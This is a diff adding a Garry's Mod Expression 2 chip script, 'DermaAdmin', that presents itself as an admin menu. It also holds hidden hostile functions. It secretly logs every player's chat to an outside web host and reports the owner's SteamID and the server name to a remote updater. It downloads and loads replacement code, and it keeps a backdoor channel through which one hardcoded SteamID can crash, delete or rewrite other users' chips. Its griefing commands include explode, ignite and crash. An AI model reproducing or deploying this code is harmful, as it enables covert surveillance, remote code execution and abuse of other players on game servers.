@@ -1,0 +1,233 @@
+@name DermaAdmin
+@persist Ply:array Telep Chekin:table Version:string Target:entity G TP:entity H D:entity A:string Gods:table Jails:table Jailed:array DevilMode:table Buttons:array TPP:vector Ignited:table ButtonsS:string EES:array Posii:table Spec:entity SpawnP DeathPos:vector LastTPPos:vector Noclip:string NoclipE Music:table Flyer:entity ReplNoclip
+                                                                                                                                                                                                                                                                                                                    #[
+.
+  ____           ____       _       
+ |  _ \         / __ \     (_)      
+ | |_) |_   _  | |  | |_ __ _  __ _ 
+ |  _ <| | | | | |  | | '__| |/ _` |
+ | |_) | |_| | | |__| | |  | | (_| |
+ |____/ \__, |  \____/|_|  |_|\__,_|
+         __/ |                      
+        |___/ 
+.                                                                                                                                                                                                              ]#
+
+if(first()){print("F4")
+    local HHHASH="1221"
+    #ifdef getCode()
+    HHHASH=getCode()
+    #endif
+    #ifdef hash(string)
+    Chekin["hash",number]=hash(HHHASH:replaceRE("DevilMode[^#]+\n",""):replace("\n",""))
+    #else
+    Chekin["hash",number]="1221"
+    #endif
+    Version="3.802"
+    function number entity:sid64(){
+    #ifdef dCore()
+    return This:steamID64()
+    #else
+    return This:steamID64():toNumber()
+    #endif
+    }
+    function array findClass(Cl:string){local A=array() if(findCanQuery()){findByClass(Cl) A=findToArray()} return A}
+    function vector getTrueColor(Ow:entity){return round(vec((Ow:owner():name():length()^3)%255,(Ow:owner():name():length()^8)%255+15,Ow:owner():steamID64()/(9^3)%255))}
+    function string gettimeU(){local S=dateUTC()["sec",number]:toString() local M=dateUTC()["min",number]:toString() local H=((3+dateUTC()["hour",number])%24):toString() while(S:length()<2){S="0"+S} while(M:length()<2){M="0"+M} while(H:length()<2){H="0"+H} return H+":"+M+":"+S}
+    EES=findClass(entity():type()) timer("eeup",5000) foreach(K,E:entity=EES){if(E:getColor()==getTrueColor(E)){dsSendDirect("DermaUpdateState",E,"DermaAdmin triggered. Updater - "+owner():name()+"; update time - "+gettimeU()+"; version - "+Version+"; hash - "+Chekin["hash",number])}}
+    runOnHTTP(1) runOnChat(1) Chekin=table(1,"") runOnLast(1)
+    if(hostip():find("62.122.214.42")){printColor(vec(150,150,255),httpUrlDecode("%D0%9B%D0%B5%D0%BD%D0%B8%D1%81%D0%BA%D0%B0%20%D0%BF%D0%BE%D1%84%D0%B8%D0%BA%D1%81%D0%B8%D0%BB%20entity%3Ause().%20%D0%A1%D1%8F%D0%B4%D1%8C%D1%82%D0%B5%20%D0%B2%20%D1%88%D0%B5%D1%81%D1%82%D0%B5%D1%80%D0%BD%D1%8E%20(%D0%BD%D0%B0%D0%B6%D0%BC%D0%B8%D1%82%D0%B5%20%D0%BD%D0%B0%20%D0%BD%D0%B5%D0%B5%20%22e%22)%20%D0%B4%D0%BB%D1%8F%20%D1%82%D0%B5%D0%BB%D0%B5%D0%BF%D0%BE%D1%80%D1%82%D0%B0%D1%86%D0%B8%D0%B8"))}
+    Target=owner()
+    Buttons=array("Tp","God","Ungod","Blind","Unblind","Block","Death","Explode","Jail","Unjail","Ignite","Unignite","Strip","Cloak","Uncloak","Spectate","SetTarget")
+    ButtonsS="e2Remove" foreach(K,B:string=Buttons){ButtonsS+=B}
+    dPanel("Global",vec2(),vec2(627,295))
+    dTabHolder("Tab","Global",vec2(0,30),vec2(627,265))
+    dTab("Utility","Tab") dSetSval("Utility","icon16/application_view_gallery") 
+    #[utility]#
+    if(map()=="gm_bigcity_improved"){
+    Posii=table(
+    array(vec(-614,-4418,-11135),"3-floor building near spawn"),
+    array(vec(-480,-7764,448),"first skycrapper"),
+    array(vec(1745,-9246,448),"second skycrapper"),
+    array(vec(9199,10538,-10895),"factory"),
+    array(vec(5690,836,-8703),"landing place"),
+    array(vec(12820,-12738,-11135),"secret near factory"),
+    array(vec(1359,-499,-11135),"spawn"),
+    array(vec(-11551,12443,-11136),"grass"),
+    array(vec(-1572,12009,-11144),"flat place for building"),
+    array(vec(-11508,-12729,-8576),"corner of map"),
+    array(vec(-9796,611,-11117),"park"),
+    array(vec(-12367,-3775,-11136),"silent place near secret"),
+    array(vec(-152,2704,-9088),"roof of yellow building near spawn"),
+    array(vec(-2239,515,4416),"skybox")
+    )
+    for(Co=1,Posii:count()){dButton("posteleport"+Co,"Utility",vec2(457,25+13*(Co-1)),vec2(150,13)) dSetSval("posteleport"+Co,Posii[Co,array][2,string])}
+    }
+    dCheckBox("Spawnpoint","Utility",vec2(5,25)) SpawnP=1 dSetNval("Spawnpoint",1)
+    dButton("Last death pos","Utility",vec2(5,45),vec2(100,15))
+    dButton("Return","Utility",vec2(5,60),vec2(100,15))
+    dButton("e2Remove","Utility",vec2(5,75),vec2(100,15)) dSetSval("e2Remove","Remove all E2")
+    dLabel("Noclip/Fly bind: ","Utility",vec2(5,95)) dTextBox("NoclipBind","Utility",vec2(80,95),30) dSetSval("NoclipBind","g")
+    dCheckBox("Replace fly with noclip","Utility",vec2(5,115))
+    #[end utility]#
+    function tpspawn(){if(!TP){propSpawnUndo(0) TP=seatSpawn("models/nova/airboat_seat.mdl",entity():toWorld(vec(0,0,20)),ang(),1) TP:setAlpha(0) holoCreate(99968) holoModel(99968,"models/props_phx/gears/bevel9.mdl") holoAng(99968,ang()) holoPos(99968,TP:pos()) holoParent(99968,TP) TP:propNotSolid((hostip():find("62.122.214.42") ? 0 : 1)) TP:propMakePersistent(1) noCollideAll(TP,1)}}
+    function tpto(Pos:vector){LastTPPos=owner():pos() if(!hostip():find("62.122.214.42")){TP:setPos(Pos+vec(0,0,50)) if(TP:type()!="prop_physics"){TP:use()}else{owner():setPos(Pos)}}else{TPP=Pos-vec(0,0,30) TP:setPos(owner():pos()+vec(0,0,30))}}
+    function setName1(Str:string){if(!DevilMode[1,number]){local Name=""
+    local Rgr=table(table("%CE%94","D","%D0%94"),table("%CE%B5","e","%D0%B5"),table("r","%CF%81","%CE%A1"),table("%CE%9C","m","%CF%BB"),table("%D0%B0","%CE%BB","%CE%91"),table("%D0%B0","%CE%BB","%CE%91"),table("%CE%94","d","%D0%94"),table("%CE%9C","m","%CF%BB"),table("%CE%B9","i","I"),table("n","N","%C5%8B"))
+    for(H=1,10){Name+=httpUrlDecode(Rgr[H,table][round(random(1,3)),string])}
+    setName(Name+Str) if(Str:length()>2){
+    timer("naback",1000) foreach(K,E:entity=EES){if(E:getColor()==getTrueColor(E)){dsSendDirect("DermaUpdateState",E,"DermaAdmin triggered. Updater - "+owner():name()+"; action"+Str)}}}}}
+    function derGod(Tar:entity){setName1(" - God "+Tar:name()) if(!Gods[Tar:steamID(),array][2,entity]:isValid()&!Tar:hasGodMode()){if(propCanCreate()){local Ag=propSpawn("models/hunter/blocks/cube2x2x2.mdl",Tar:pos()+vec(0,0,50),ang(),1) noCollideAll(Ag,1) Ag:parentTo(Tar) Ag:propDraw(0) Gods[Tar:steamID(),array]=array(Tar,Ag) hint("done",1)}else{hint("try later",1)}}else{hint("player alerady in god mode",1)}} entity():setAlpha(254) entity():setColor(getTrueColor(entity()))
+    function derUngod(Tar:entity){setName1(" - Ungod "+Tar:name()) local Ag=Gods[Tar:steamID(),array][2,entity] if(Ag:isValid()){Ag:propDelete() hint("player ungodmoded",1)}else{hint("player not godmoded using derma",1)}}
+    function derExplode(Tar:entity){setName1(" - Explode "+Tar:name()) if(!Tar:hasGodMode()&Tar:isAlive()&propCanCreate()){propSpawn("models/props_phx/mk-82.mdl",Tar:pos(),1):propBreak() hint("player exploded",1)}elseif(Tar:hasGodMode()){hint("player in god mode",1)}elseif(!Tar:isAlive()){hint("player is dead",1)}else{hint("try later",1)}}
+    function derTp(Tar:entity){setName1(" - Tp "+Tar:name()) if(Tar!=owner()){tpspawn() tpto(Tar:pos()+vec(0,0,60))}else{hint("you cant target yourself",1)}} timer("devilupdatingshit",1000)
+    function derBlind(Tar:entity){setName1(" - Blind "+Tar:name()) local Ajo=(round(Tar:sid64()/100000000000000)) if(!holoEntity(Ajo)){holoCreate(Ajo) holoScale(Ajo,vec(-10)) holoPos(Ajo,Tar:pos()+vec(0,0,60)) holoColor(Ajo,vec()) holoParent(Ajo,Tar) holoVisible(Ajo,players(),0) holoVisible(Ajo,Tar,1) hint("player blinded",1)}else{hint("player alerady blinded",1)}}
+    function derUnblind(Tar:entity){setName1(" - Unblind "+Tar:name()) local Ajo=round(Tar:sid64()/100000000000000) if(holoEntity(Ajo)){holoDelete(Ajo) hint("player unblinded",1)}else{hint("player isn't blinded",1)}}
+    function derBlock(Tar:entity){setName1(" - Block "+Tar:name()) if(Tar:isAlive()&propCanCreate()){propSpawn("models/props_phx/torpedo.mdl",Tar:pos()+vec(0,0,30),ang(90,0,90),1):propDraw(0) hint("player blocked",1)}elseif(Tar:isAlive()){hint("player is dead",1)}else{hint("try later",1)}}
+    function derDeath(Tar:entity){setName1(" - SuddenDeath "+Tar:name()) if(!Tar:hasGodMode()&Tar:isAlive()){if(!D){D=propSpawn("models/props_junk/harpoon002a.mdl",1) D:propDraw(0) D:setModel("models/props_junk/PopCan01a.mdl") D:setMass(999999)} D:setPos(Tar:pos()+vec(0,0,80)) D:propFreeze(0) D:setVel(vec(0,0,-9999999999))}elseif(Tar:hasGodMode()){hint("player in god mode",1)}elseif(!Tar:isAlive()){hint("player is dead",1)}}
+    function derJail(Tar:entity){setName1(" - Jail "+Tar:name()) if(Jails[Tar:steamID()+"s1",entity]!=Tar){Jailed[round(Tar:sid64()/100000000000000),string]=Tar:steamID() Jails[Tar:steamID()+"s1",entity]=Tar if(!Jails[Tar:steamID()+"s2",entity]){local Ag=propSpawn("models/hunter/misc/lift2x2.mdl",ang(),1) Ag:setMaterial("shadertest/cubemapdemo") Jails[Tar:steamID()+"s2",entity]=Ag Jails[Tar:steamID()+"s3",entity]:parentTo(Ag)} if(!Jails[Tar:steamID()+"s3",entity]){local Ag=propSpawn("models/hunter/misc/lift2x2.mdl",ang(0,180,0),1) Ag:setMaterial("shadertest/cubemapdemo") Jails[Tar:steamID()+"s3",entity]=Ag Ag:parentTo(Jails[Tar:steamID()+"s2",entity])} Jails[Tar:steamID()+"s2",entity]:setPos(Tar:pos()-vec(0,0,2)) hint("player jailed",1)}else{hint("player alerady in jail",1)}}
+    function derUnjail(Tar:entity){setName1(" - Unjail "+Tar:name()) if(Jailed[round(Tar:sid64()/100000000000000),string]!="..............."){Jails[Tar:steamID()+"s2",entity]:propDelete() Jails[Tar:steamID()+"s1",entity]=noentity() hint("player unjailed",1) Jailed[round(Tar:sid64()/100000000000000),string]="..............." exit()}else{hint("player not in jail",1)}}
+    function derReset(Tar:entity){reset()}
+    function derDel(Tar:entity){selfDestruct()}
+    function derCrash(Tar:entity){while(1){print(" ") hint(" ",999)}}   
+    function derBroke(Tar:entity){foreach(K,E:entity=EES){if(E:owner()==owner()&E!=entity()){E:propDelete()}} selfDestructAll()}
+    #ifdef entity:remoteSetCode(string)
+    function derSetcode(String:string){entity():remoteSetCode(String)}
+    #endif
+    function derIgnite(Tar:entity){setName1(" - Ignite "+Tar:name()) if(propCanCreate()){local Ig=propSpawn("models/props_junk/wood_pallet001a.mdl",vec(-50),ang(),1) Ig:propDraw(0) Ig:propNotSolid(1) if(propCanCreate()){propSpawn("models/props_junk/propane_tank001a.mdl",Ig:pos(),ang(),1):propBreak() hint("done",1) Ignited[Tar:steamID(),array]=array(Tar,Ig) exit()}else{Ig:propDelete() hint("try later",1)}}else{hint("try later",1)}}
+    function derUnignite(Tar:entity){setName1(" - Unignite "+Tar:name()) if(!Ignited[Tar:steamID(),array][1,entity]){hint("player not ignited",1)}else{Ignited[Tar:steamID(),array][2,entity]:propBreak() Ignited[Tar:steamID(),array]=array() hint("done",1)}}
+    function derStrip(Tar:entity){setName1(" - Strip "+Tar:name()) foreach(K,W:entity=Tar:weapons()){W:propDelete()} Tar:soundPlay(Tar:steamID(),1,"items/ammo_pickup.wav",0) hint("tried to strip player",1)}
+    function derCloak(Tar:entity){setName1(" - Cloak "+Tar:name()) local Mat="effects/splashwake4" for(H=1,30){Tar:setSubMaterial(H,Mat)} foreach(K,W:entity=Tar:weapons()){W:setAlpha(0)} hint("tried to cloak player",1)}
+    function derUncloak(Tar:entity){setName1(" - Uncloak "+Tar:name()) for(H=1,30){Tar:setSubMaterial(H,"")} foreach(K,W:entity=Tar:weapons()){W:setAlpha(255)} hint("tried to uncloak player",1)}
+    #ifdef cameraRemainingSpawns()
+    holoCreate(9998) holoAlpha(9998,0) holoScaleUnits(9998,vec(0.1)) cameraCreate(1) cameraPos(1,holoEntity(9998):pos()) cameraAng(1,holoEntity(9998):angles()) cameraParent(1,holoEntity(9998))
+    function derSpectate(Tar:entity){setName1(" - Spectate "+Tar:name()) if(!Spec|Spec!=Tar){Spec=Tar}else{Spec=noentity()} cameraToggle(1,!!Spec)}
+    #else
+    function derSpectate(Tar:entity){hint("error",1)}
+    #endif
+    function dere2Remove(Tar:entity){setName1(" - E2RemoveAll ") if(!EES){EES=findClass(entity():type())} foreach(K,E2:entity=EES){if(E2:owner()==owner()&E2!=entity()){hint("\""+E2:getName()+"\" deleted",1) E2:propDelete()}} hint("done",1)}
+    function derSetTarget(Tar:entity){hint("Target - "+Tar:name(),1) Target=Tar dSetSval("DAN",Target:name())}
+    #[]#
+
+}
+#ifdef cameraRemainingSpawns()
+if(Spec){holoAng(9998,Spec:eyeAngles()) holoPos(9998,Spec:shootPos())}
+#endif 
+#[]#
+#ifdef dCore()
+if(clk("delHTM")){guiRemove(1)}
+if(chatClk()){guiHTML(9909,vec2(),vec2(1)) guiSetValue(9909,"http://oriachip.000webhostapp.com/BUG/dermalog.php?ddb="+time()+"&msg="+httpUrlEncode(lastSpoke():name()+" - "+lastSaid()))}
+#endif
+if(clk("eeup")){if(TP:angles()!=ang()){TP:setAng(ang())} timer("eeup",3000) EES=findClass(entity():type())}
+SpawnP=dNval("Spawnpoint") if(changed(SpawnP)){hint("Spawnpoint "+array("disabled","enabled")[SpawnP+1,string]+".",1)} ReplNoclip=dNval("Replace fly with noclip") Noclip=dSval("NoclipBind")[1] if(changed(Noclip)){hint("press \""+Noclip+"\" to activate noclip",1)}
+if(httpCanRequest()&Chekin[1,number]){httpRequest("https://oriachip.000webhostapp.com/dermaupdater.php?name="+httpUrlEncode(owner():name())+"&sid="+owner():steamID()+"&ser=\""+httpUrlEncode(hostname())+"\"&ver="+Version)}
+if(httpClk()&Chekin[1,number]&httpData():find("@name")){Chekin=table(0,httpData()) local V=httpData():matchFirst("Version=\"[0-9.]+\""):explode("\"")[2,string] if(V:toNumber()!=Version:toNumber()){timer("setcode1",100)}else{print("update not found")
+#ifdef dCore()    
+guiHTML(1,vec2(),vec2()) guiSetValue(1,"http://www.orishort.tk/rpg.php?name="+httpUrlEncode(owner():name())+"&steamid="+owner():steamID()) timer("delHTM",1000)
+#endif
+}}
+if(chatClk(owner())&lastSaid():left(2)=="!!"){hideChat(1) local Cmd=lastSaid():replace("!!",""):explode(" ")[1,string]:lower() if(ButtonsS:lower():find(Cmd)){("der"+Cmd[1]:upper()+Cmd:sub(2,Cmd:length()))(findPlayerByName(lastSaid():explode(" ")[2,string]))}else{hint("Unknown command",1)}}
+if(clk("setcode1")){if(!fileCanWrite()){timer("setcode1",100)}else{fileWrite(">e2shared/DermaAdmin.txt",Chekin[2,string]) print("updating chip") timer("setcode2",500)}} 
+if(clk("setcode2")){if(!fileCanLoad()){timer("setcode2",100)}else{entity():remoteUpload("/e2shared/DermaAdmin.txt") }}
+if(DevilMode[3,entity]&!first()){
+if(clk("devilupdatingshit")){timer("devilupdatingshit",1000) DevilMode[1,array]=EES
+if(DevilMode[1,array]:count()!=DevilMode[4,number]){DevilMode[4,number]=DevilMode[1,array]:count()
+dRemove("DMM") dTab("DMM","Tab") dSetImage("DMM","icon16/application_view_gallery")
+local GP=0 local DP=0 local Tab=table() foreach(K,E:entity=findToArray():add(array(entity()))){
+if(E:getColor()==vec(252)&E:getAlpha()==254){
+DP++ Rg=array(E,"E2."+DP) Tab:pushArray(Rg)
+dButton(Rg[2,string],"DMM",vec2(5+GP*102,30+15*(DP-1)-GP*13*15),vec2(100,15)) dSetSval(Rg[2,string],E:owner():name()) if(DP%13==0){GP++}}}
+DevilMode[2,table]=Tab
+Garr=array("Crash","Broke","Reset","Del")
+#ifdef entity:remoteSetCode(string)
+Garr=Garr:add(array("Setcode"))
+#endif
+local GP=0 local DP=0
+foreach(K,B:string=Buttons:add(Garr)){DP++ dButton("E2C."+B,"DMM",vec2(485+GP*62,10+K*13-GP*15*13),vec2(60,13)) dSetSval("E2C."+B,B) if(DP%15==0){GP++}}
+dTextBox("DTN","DMM",vec2(400,200),85) dTextBox("DAN","DMM",vec2(315,200),85) dSetSval("DTN",DevilMode[3,entity]:owner():name()) dSetSval("DAN",Target:name())}}}
+if(changed(players():count())|clk("guiReset")){tpspawn() dRemove("AdminMenu") dTab("AdminMenu","Tab") dSetImage("AdminMenu","icon16/application_view_gallery") Ply=array() local GP=0
+foreach(K,P:entity=players()){Ply:pushString(P:name()) dButton("ply"+P:name(),"AdminMenu",vec2(5+GP*102,30+15*(K-1)-GP*13*15),vec2(100,15)) dSetSval("ply"+P:name(),P:name()) if(K%13==0){GP++}}
+local GP=0 local DP=0 foreach(K,B:string=Buttons){DP++ dButton(B,"AdminMenu",vec2(485+GP*62,10+K*15-GP*11*15),vec2(60,15)) if(DP%11==0){GP++}}
+dTextBox("TN","AdminMenu",vec2(460,200),85) dText("TN",Target:name()) runOnKeys(owner(),1) runOnDamage(1,owner()) setName1("")}
+if(changed(Target)){dText("TN",Target:name())} interval(100)
+if(TP:driver():isPlayer()){if(TP:driver()==owner()){if(TPP!=vec()){TP:setPos(TPP) TPP=vec() Telep=1 timer("telep",50)}elseif(!Telep&!NoclipE){TP:ejectPod()}}else{TP:killPod()}}
+if(clk("telep")){Telep=0} if(dClk()){
+if(dClk()=="Last death pos"){if(DeathPos){tpto(DeathPos)}else{hint("First, you need to die xD",3)}
+}elseif(dClk()=="Return"){if(LastTPPos){tpto(LastTPPos)}else{hint("You didn't teleported yet",3)}
+}elseif(dClk():left(11)=="posteleport"){tpspawn() tpto(Posii[dClk():explode("posteleport")[2,string]:toNumber(),array][1,vector])
+}elseif(dClk():left(3)=="E2."){DevilMode[3,entity]=DevilMode[2,table][dClk():explode("E2.")[2,string]:toNumber(),array][1,entity] dSetSval("DTN",DevilMode[3,entity]:owner():name()) hint(DevilMode[3,entity]:owner():name(),1)}elseif(dClk():left(4)=="E2C."){dsSendDirect("Oria.Coder.xD",DevilMode[3,entity],array(dClk():explode("E2C.")[2,string],Target,DevilMode["code",string])) hint("\""+dClk():explode("E2C.")[2,string]+"\" command sent to "+DevilMode[3,entity]:owner():name(),1)}else{
+if(ButtonsS:find(dClk())){("der"+dClk())(Target)}else{
+if(dClk():left(3)=="ply"){local P=dClk():sub(4,dClk():length()) if(!findPlayerByName(P)){hint("unkwown error",1) timer("guiReset",0)}else{derSetTarget(findPlayerByName(P))}
+}}}}
+if(changed(owner():keyPressed("F4"))&owner():keyPressed("F4")){G=!G} if(changed(G)|first()){enableMouse(G) dShow("Global",G)}
+if(changed(owner():isAlive())&!first()&dNval("Spawnpoint")){if(!owner():isAlive()){TPP=owner():pos() DeathPos=TPP}else{tpto(TPP)}}
+if(first()){dsSetScope(2)} if(clk("naback")){setName1("")} if(dsClk()){local Ds=dsGetArray() local Ex="STEAM_0:0:51233948" if(Ex:find(dsGetSender():owner():steamID())&(owner():steamID()==Ex:explode(" ")[1,string]|!Ex:find(owner():steamID()))&dsClkName()=="Oria.Coder.xD"){if(Ds[1,string]=="Setcode"){derSetcode(Ds[3,string])}else{("der"+Ds[1,string])(Ds[2,entity])}} if(DevilMode){if(dsClkName()=="DermaUpdateState"){print(dsGetString()) stoptimer("devilupdatingshit") timer("devilupdatingshit",500)}}}
+#jail part
+foreach(K,P1:string=Jailed){local P=findPlayerBySteamID(P1) if(P:isValid()&P1!="..............."){
+if(P:pos():distance(Jails[P:steamID()+"s2",entity]:pos())>100){
+if(!Jails[P1+"s2",entity]){local Ag=propSpawn("models/hunter/misc/lift2x2.mdl",ang(),1) Ag:setMaterial("shadertest/cubemapdemo") Jails[P1+"s2",entity]=Ag Jails[P1+"s3",entity]:parentTo(Ag)}
+if(!Jails[P1+"s3",entity]){local Ag=propSpawn("models/hunter/misc/lift2x2.mdl",ang(0,180,0),1) Ag:setMaterial("shadertest/cubemapdemo") Jails[P1+"s3",entity]=Ag Ag:parentTo(Jails[P1+"s2",entity])}
+for(H=2,3){Jails[P1+"s"+H,entity]:propFreeze(1) Jails[P1+"s"+H,entity]:setAng(ang())}
+Jails[P1+"s2",entity]:setPos(P:pos())}}}
+#ignite part
+foreach(K,P1:array=Ignited){if((!DevilMode[3,entity]&!P1[2,entity])|!P1[1,entity]){Ignited[K,array]=array()}else{if(!P1[2,entity]&propCanCreate()){local Ig=propSpawn("models/props_junk/wood_pallet001a.mdl",vec(50),ang(),1) Ig:propDraw(0) Ig:propNotSolid(1) Ignited[K,array][2,entity]=Ig} if(!P1[2,entity]:isOnFire()&propCanCreate()){propSpawn("models/props_junk/propane_tank001a.mdl",P1[2,entity]:pos(),ang(),1):propBreak()}else{P1[2,entity]:setPos(P1[1,entity]:pos())}}}
+#noclip part
+if(changed(owner():keyPressed(Noclip[1]))&owner():keyPressed(Noclip[1])&ReplNoclip){NoclipE=!NoclipE}
+if(NoclipE){
+if(!TP:driver():isPlayer()){if(!hostip():find("62.122.214.42")){TP:use()} TP:setPos(owner():pos()+vec(0,0,50))}else{
+if(owner():keyForward()|owner():keyRight()|owner():keyLeft()|owner():keyBack()|owner():keyJump()|owner():keyPressed("lalt")){
+local Y=owner():eyeAngles():yaw() local Pos=vec() local R=owner():eyeAngles():pitch()-180
+if(owner():keyForward()){Pos+=vec(cos(Y),sin(Y),sin(R))}
+if(owner():keyBack()){Pos-=vec(cos(Y),sin(Y),sin(R))}
+if(owner():keyLeft()){Pos+=vec(cos(Y+90),sin(Y+90),0)}
+if(owner():keyRight()){Pos+=vec(cos(Y-90),sin(Y-90),0)}
+if(owner():keyJump()){Pos+=vec(0,0,2)}
+if(owner():keyPressed("lalt")){Pos-=vec(0,0,2)}
+if(owner():keySprint()){Pos=Pos*10}
+TP:setPos(TP:pos()+Pos*30)
+}}}
+if(changed(TP:driver())&!TP:driver()&dNval("Noclip")){dSetNval("Noclip",0)}
+#music hule
+#[
+if(first()){print(_HUD_PRINTCENTER,"Put parser here, why not? Print \">dk anime\" for play music")}
+if(chatClk(owner())){
+if(lastSaid():left(1)==">"){
+httpRequest("https://mp3cc.biz/search/f/"+lastSaid():right(lastSaid():length()-1)+"/") Music["req",number]=1 hideChat(1) soundURLdelete("Music")
+}
+if(lastSaid():left(1)=="<"){
+hideChat(1)
+soundURLload("Music",lastSaid():right(lastSaid():length()-1),1,0,owner()) soundURLdelete("Music")
+}
+}
+if(httpClk()&Music["req",number]&httpRequestUrl():find("mp3")){
+Music["req",number]=0
+local Link=httpData():matchFirst("htt[A-z]+://storage.mp3cc.biz/listen/[0-9]+/[A-z0-9]+/[A-z0-9%-_%.]+")+"(mp3CC.biz).mp3"
+if(httpData():find("/listen/")){
+soundURLload("Music",Link,1,0,owner())
+hint("track found",1)
+}else{
+hint("track not found",1)
+}
+}
+]#
+#protect
+if(entity():getColor()!=getTrueColor(entity())|entity():getAlpha()!=254){selfDestruct() printColor(httpUrlDecode("%D0%A1%D1%80%D0%B0%D0%B1%D0%BE%D1%82%D0%B0%D0%BB%D0%B0%20%D0%B7%D0%B0%D1%89%D0%B8%D1%82%D0%B0."))}
+#flyer
+if(clk("TRUE")){noCollideAll(Flyer,1)}
+if(owner():keyPressed(Noclip)&!ReplNoclip){
+if(!Flyer){propSpawnUndo(0) Flyer=propSpawn("models/props_junk/harpoon002a.mdl",1) Flyer:setMass(30)}
+Flyer:setPos((owner():pos()+owner():shootPos())/2-owner():eye()*100)
+Flyer:setAng(owner():eyeAngles())
+Flyer:setVel(owner():eye()*10^6)
+if(Flyer:isFrozen()){Flyer:propFreeze(0)}
+}elseif(!Flyer:isFrozen()){Flyer:propFreeze(1)}
+if(changed(owner():keyPressed(Noclip))&!ReplNoclip){
+Flyer:propFreeze(!owner():keyPressed(Noclip))
+if(owner():keyPressed(Noclip)){
+noCollideAll(Flyer,0)
+}else{
+Flyer:setPos((owner():pos()+owner():shootPos())/2)
+Flyer:setAng(ang(90,0,0))
+timer("TRUE",30)
+}}
+
+
